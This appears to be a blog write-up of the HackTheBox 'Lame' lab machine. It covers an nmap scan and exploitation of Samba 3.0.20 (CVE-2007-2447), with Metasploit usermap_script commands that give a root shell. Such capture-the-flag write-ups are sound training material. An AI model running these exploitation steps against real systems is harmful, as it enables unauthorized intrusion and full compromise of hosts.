---
title: HackTheBox — Lame
date: 2025-02-01
image: /assets/img/fb2d9f98400e3c802a0d7145e125c4ff.png
categories:
  - HackTheBox
subcategory: Machines
difficulty: Facile
tags:
  - linux
  - samba
  - cve
  - metasploit
toc: true
---
## Overview

Lame is a beginner HackTheBox machine exploiting an outdated Samba service (CVE-2007-2447).

## Reconnaissance

```bash
nmap -sC -sV -oN nmap/lame 10.10.10.3
```

Open ports:

* 21 — FTP (vsftpd 2.3.4)
* 22 — SSH
* 139/445 — Samba 3.0.20

## Exploitation

Samba 3.0.20 is vulnerable to a command injection via the `username` field.

```bash
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
run
```

## Flags

Direct root shell obtained — both user and root flags accessible immediately.

## Key Takeaways

* Keep services updated — legacy Samba versions are well-documented attack vectors
* Always check for known CVEs on identified service versions
